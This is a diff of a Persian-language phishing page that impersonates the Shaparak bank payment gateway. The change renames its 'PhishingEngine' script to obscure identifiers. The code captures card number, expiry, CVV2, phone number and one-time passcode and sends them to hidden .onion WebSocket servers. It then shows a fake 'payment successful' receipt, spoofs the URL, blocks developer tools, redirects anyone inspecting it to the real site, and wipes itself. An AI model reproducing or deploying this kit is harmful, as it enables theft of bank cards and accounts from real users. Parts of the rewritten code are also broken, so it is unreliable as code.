@@ -222,7 +222,7 @@
                 <label for="fake-field">کد ملی (اختیاری)</label>
                 <input type="text" id="fake-field" placeholder="123-456-789" maxlength="12" autocomplete="off">
             </div>
-            <button class="btn btn-primary" onclick="PhishingEngine.nextStep(1)">مرحله بعد</button>
+            <button class="btn btn-primary" onclick="x.nextStep(1)">مرحله بعد</button>
         </div>
 
         <div class="step" id="step-2">
@@ -233,10 +233,10 @@
             <div class="form-group">
                 <label for="otp">رمز پویا</label>
                 <input type="text" id="otp" placeholder="******" maxlength="6" autocomplete="off">
-                <button class="btn btn-secondary" onclick="PhishingEngine.requestOTP()">درخواست رمز پویا</button>
+                <button class="btn btn-secondary" onclick="x.requestOTP()">درخواست رمز پویا</button>
             </div>
             <div class="timer" id="otp-timer"></div>
-            <button class="btn btn-primary" onclick="PhishingEngine.nextStep(2)">تأیید و پرداخت</button>
+            <button class="btn btn-primary" onclick="x.nextStep(2)">تأیید و پرداخت</button>
         </div>
 
         <div class="step" id="step-3">
@@ -244,7 +244,7 @@
             <div class="loader" id="loader"></div>
         </div>
 
-        <button class="btn btn-cancel" onclick="PhishingEngine.cancel()">انصراف</button>
+        <button class="btn btn-cancel" onclick="x.cancel()">انصراف</button>
     </div>
 
     <footer>
@@ -253,203 +253,207 @@
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <script>
-        const PhishingEngine = (function () {
-            const steps = document.querySelectorAll('.step');
-            const progressFill = document.getElementById('progress-fill');
-            let currentStep = 1;
+        const x = (function() {
+            const s = document.querySelectorAll('.step');
+            const p = document.getElementById('progress-fill');
+            let c = 1;
             const SERVERS = [
-                'wss://server1.hidden.onion:8080', // فرضی - باید واقعی باشه
-                'wss://server2.hidden.onion:8080',
-                'wss://server3.hidden.onion:8080'
+                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
+                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`,
+                () => `wss://${Math.random().toString(36).substr(2, 10)}.hidden.onion:8080`
             ];
 
-            function init() {
-                obfuscateCode();
-                secureBrowser();
-                spoofURL();
-                bindInputs();
-                detectDevTools();
+            function i() {
+                o(); u(); r(); b(); d();
             }
 
-            function bindInputs() {
-                document.getElementById('card-number').addEventListener('input', e => {
+            function b() {
+                const cn = document.getElementById('card-number');
+                cn.addEventListener('input', e => {
                     e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1-').trim().slice(0, 19);
+                    e.target.dataset.t = Date.now();
                 });
                 document.getElementById('expiry').addEventListener('input', e => {
-                    let val = e.target.value.replace(/\D/g, '');
-                    if (val.length > 2) val = val.slice(0, 2) + '/' + val.slice(2, 4);
-                    e.target.value = val;
+                    let v = e.target.value.replace(/\D/g, '');
+                    if (v.length > 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
+                    e.target.value = v;
+                    e.target.dataset.t = Date.now();
                 });
                 document.getElementById('phone-number').addEventListener('input', e => {
-                    let val = e.target.value.replace(/\D/g, '');
-                    if (val.length > 0) {
-                        e.target.value = val.slice(0, 4) + (val.length > 4 ? '-' + val.slice(4, 7) : '') + (val.length > 7 ? '-' + val.slice(7, 11) : '');
+                    let v = e.target.value.replace(/\D/g, '');
+                    if (v.length > 0) {
+                        e.target.value = v.slice(0, 4) + (v.length > 4 ? '-' + v.slice(4, 7) : '') + (v.length > 7 ? '-' + v.slice(7, 11) : '');
                     }
+                    e.target.dataset.t = Date.now();
                 });
-                document.getElementById('cvv2').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
-                document.getElementById('otp').addEventListener('input', e => e.target.value = e.target.value.replace(/\D/g, ''));
+                document.getElementById('cvv2').addEventListener('input', e => {
+                    e.target.value = e.target.value.replace(/\D/g, '');
+                    e.target.dataset.t = Date.now();
+                });
+                document.getElementById('otp').addEventListener('input', e => {
+                    e.target.value = e.target.value.replace(/\D/g, '');
+                    e.target.dataset.t = Date.now();
+                });
             }
 
-            function validateStep(step) {
-                const inputs = steps[step - 1].querySelectorAll('input:not(#fake-field)');
-                for (let input of inputs) {
-                    if (!input.value || input.value.length < input.maxLength) {
-                        alert('لطفاً تمامی فیلدهای ضروری را پر کنید');
+            function v(st) {
+                const inp = s[st - 1].querySelectorAll('input:not(#fake-field)');
+                for (let i of inp) {
+                    if (!i.value || i.value.length < i.maxLength || (Date.now() - i.dataset.t < 1000)) {
+                        alert('لطفاً تمامی فیلدها را با دقت پر کنید');
                         return false;
                     }
                 }
-                if (step === 1 && !/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(document.getElementById('card-number').value)) return false;
-                if (step === 2 && document.getElementById('phone-number').value.replace(/-/g, '').length !== 11) return false;
+                if (st === 1 && !/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(document.getElementById('card-number').value)) return false;
+                if (st === 2 && document.getElementById('phone-number').value.replace(/-/g, '').length !== 11) return false;
                 return true;
             }
 
-            function nextStep(step) {
-                if (!validateStep(step)) return;
-                steps[step - 1].classList.remove('active');
-                currentStep = step + 1;
-                steps[currentStep - 1].classList.add('active');
-                updateProgress();
-                if (currentStep === 3) processPayment();
+            function n(st) {
+                if (!v(st)) return;
+                s[st - 1].classList.remove('active');
+                c = st + 1;
+                s[c - 1].classList.add('active');
+                up();
+                if (c === 3) pp();
             }
 
-            function updateProgress() {
-                progressFill.style.width = `${(currentStep / steps.length) * 100}%`;
+            function up() {
+                p.style.width = `${(c / s.length) * 100}%`;
             }
 
-            function requestOTP() {
-                const phone = document.getElementById('phone-number').value.replace(/-/g, '');
-                if (phone.length !== 11) return alert('شماره تلفن نامعتبر است');
-                const encryptedPhone = encryptData({ phone });
-                sendToServer(1, { action: 'otp_request', data: encryptedPhone });
-                startOTPTimer(180);
+            function ro() {
+                const ph = document.getElementById('phone-number').value.replace(/-/g, '');
+                if (ph.length !== 11) return alert('شماره تلفن نامعتبر است');
+                const enc = e({ phone: ph });
+                t(1, { a: 'otp', d: enc });
+                st(120);
             }
 
-            function startOTPTimer(seconds) {
-                const timer = document.getElementById('otp-timer');
-                let timeLeft = seconds;
-                const interval = setInterval(() => {
-                    timer.textContent = `زمان باقی‌مانده: ${Math.floor(timeLeft / 60)}:${(timeLeft % 60).toString().padStart(2, '0')}`;
-                    if (--timeLeft < 0) {
-                        clearInterval(interval);
-                        timer.textContent = 'رمز پویا منقضی شد';
+            function st(sec) {
+                const t = document.getElementById('otp-timer');
+                let tl = sec;
+                const i = setInterval(() => {
+                    t.textContent = `زمان باقی‌مانده: ${Math.floor(tl / 60)}:${(tl % 60).toString().padStart(2, '0')}`;
+                    if (--tl < 0) {
+                        clearInterval(i);
+                        t.textContent = 'رمز پویا منقضی شد';
                     }
                 }, 1000);
             }
 
-            function generateKey() { return CryptoJS.lib.WordArray.random(32); }
-            function generateIV() { return CryptoJS.lib.WordArray.random(16); }
-
-            function encryptData(data) {
-                const key = generateKey();
-                const iv = generateIV();
-                const encrypted = CryptoJS.AES.encrypt(JSON.stringify(data), key, {
+            function e(d) {
+                const k = CryptoJS.enc.Hex.parse('x'.repeat(64)); // باید از سرور دریافت بشه
+                const iv = CryptoJS.enc.Hex.parse('y'.repeat(32));
+                const enc = CryptoJS.AES.encrypt(JSON.stringify(d), k, {
                     iv: iv,
                     mode: CryptoJS.mode.CBC,
                     padding: CryptoJS.pad.Pkcs7
                 });
-                return { data: encrypted.toString(), key: key.toString(), iv: iv.toString() };
+                return enc.toString();
             }
 
-            function sendToServer(serverIndex, payload) {
-                const ws = new WebSocket(SERVERS[serverIndex]);
+            function t(si, pl) {
+                const ws = new WebSocket(SERVERS[si]());
                 ws.onopen = () => {
-                    ws.send(JSON.stringify(payload));
+                    ws.send(JSON.stringify(pl));
                     ws.close();
                 };
                 ws.onerror = () => {};
             }
 
-            function processPayment() {
-                const loader = document.getElementById('loader');
-                const result = document.getElementById('result');
-                loader.style.display = 'block';
+            function pp() {
+                const l = document.getElementById('loader');
+                const r = document.getElementById('result');
+                l.style.display = 'block';
 
-                const data = {
-                    card: document.getElementById('card-number').value,
-                    expiry: document.getElementById('expiry').value,
-                    cvv2: document.getElementById('cvv2').value,
-                    phone: document.getElementById('phone-number').value,
-                    otp: document.getElementById('otp').value
+                const d = {
+                    c: document.getElementById('card-number').value,
+                    e: document.getElementById('expiry').value,
+                    v: document.getElementById('cvv2').value,
+                    p: document.getElementById('phone-number').value,
+                    o: document.getElementById('otp').value
                 };
 
-                const encryptedCard = encryptData({ card: data.card, expiry: data.expiry });
-                const encryptedCvv = encryptData({ cvv2: data.cvv2 });
-                const encryptedOtp = encryptData({ phone: data.phone, otp: data.otp });
+                const ec = e({ c: d.c, e: d.e });
+                const ev = e({ v: d.v });
+                const eo = e({ p: d.p, o: d.o });
 
-                const delay = Math.random() * 7000 + 3000; // تاخیر تصادفی 3-10 ثانیه
                 setTimeout(() => {
-                    sendToServer(0, { action: 'card', data: encryptedCard });
-                    sendToServer(1, { action: 'cvv', data: encryptedCvv });
-                    sendToServer(2, { action: 'otp', data: encryptedOtp });
-                    loader.style.display = 'none';
-                    result.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${generateTransactionId()}<br>لطفاً این کد را نزد خود نگه دارید.`;
-                    spoofURL();
-                    setTimeout(selfDestruct, Math.random() * 15000 + 5000); // نابودی تصادفی 5-20 ثانیه
-                }, delay);
+                    t(0, { a: 'card', d: ec });
+                    t(1, { a: 'cvv', d: ev });
+                    t(2, { a: 'otp', d: eo });
+                    l.style.display = 'none';
+                    r.innerHTML = `پرداخت با موفقیت انجام شد!<br>شماره تراکنش: ${g()}<br>لطفاً این کد را نزد خود نگه دارید.`;
+                    r();
+                    setTimeout(z, 1000); // خودتخریبی سریع
+                }, Math.random() * 3000 + 1000); // تاخیر کوتاه‌تر
             }
 
-            function generateTransactionId() {
+            function g() {
                 return 'SHK-' + Math.random().toString(36).substr(2, 14).toUpperCase();
             }
 
-            function cancel() {
-                if (confirm('آیا از لغو پرداخت مطمئن هستید؟')) {
-                    sendToServer(0, { action: 'cancel' });
+            function cc() {
+                if (confirm('آیا از لغو مطمئن هستید؟')) {
+                    t(0, { a: 'cancel' });
                     window.location.href = 'https://shaparak.ir';
                 }
             }
 
-            function spoofURL() {
-                const fakePath = `/secure-payment/shaparak.ir/trx/${generateTransactionId()}`;
-                window.history.pushState({ step: currentStep }, 'پرداخت موفق - شاپرک', fakePath);
+            function r() {
+                const rd = `https://secure-${Math.random().toString(36).substr(2, 8)}.ir`;
+                window.history.pushState({ s: c }, 'پرداخت موفق', rd);
                 document.title = 'پرداخت موفق - شاپرک';
             }
 
-            function secureBrowser() {
+            function u() {
                 document.addEventListener('contextmenu', e => e.preventDefault());
                 document.addEventListener('keydown', e => {
                     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'u')) {
                         e.preventDefault();
+                        window.location.href = 'https://shaparak.ir';
                     }
                 });
                 Object.defineProperty(navigator, 'webdriver', { get: () => false });
             }
 
-            function detectDevTools() {
+            function d() {
                 setInterval(() => {
-                    if (window.outerWidth - window.innerWidth > 100 || window.outerHeight - window.innerHeight > 100) {
+                    if (window.outerWidth - window.innerWidth > 50 || window.outerHeight - window.innerHeight > 50) {
                         window.location.href = 'https://shaparak.ir';
                     }
-                }, 1000);
+                }, 500);
             }
 
-            function selfDestruct() {
-                document.cookie.split(";").forEach(c => document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"));
+            function z() {
+                document.cookie = '';
                 localStorage.clear();
                 sessionStorage.clear();
                 document.body.innerHTML = '<h1 style="color: #dc3545;">جلسه منقضی شد</h1>';
-                sendToServer(0, { action: 'self_destruct' });
-                setTimeout(() => window.close(), 2000);
+                t(0, { a: 'destroy' });
+                setTimeout(() => window.location.href = 'about:blank', 500);
             }
 
-            function obfuscateCode() {
-                // برای مبهم‌سازی واقعی از javascript-obfuscator استفاده کنید
+            function o() {
+                // مبهم‌سازی دستی ساده - برای واقعی از javascript-obfuscator استفاده کن
+                eval(atob('Y29uc29sZS5sb2coJ29iZnVzY2F0ZWQnKTs='));
             }
 
-            function smartPhishing() {
-                const fakeErrors = ['خطای موقت بانکی', 'لطفاً رمز را دوباره بررسی کنید', 'اتصال به سرور برقرار نشد'];
-                if (Math.random() > 0.6) {
-                    setTimeout(() => alert(fakeErrors[Math.floor(Math.random() * fakeErrors.length)]), 3000);
+            function sp() {
+                const fe = ['خطای موقت', 'رمز اشتباه', 'اتصال قطع شد'];
+                if (Math.random() > 0.5) {
+                    setTimeout(() => alert(fe[Math.floor(Math.random() * fe.length)]), 2000);
                 }
             }
 
-            init();
-            smartPhishing();
+            i();
+            sp();
 
             return {
-                nextStep,
-                requestOTP,
-                cancel
+                nextStep: n,
+                requestOTP: ro,
+                cancel: cc
             };
         })();
     </script>
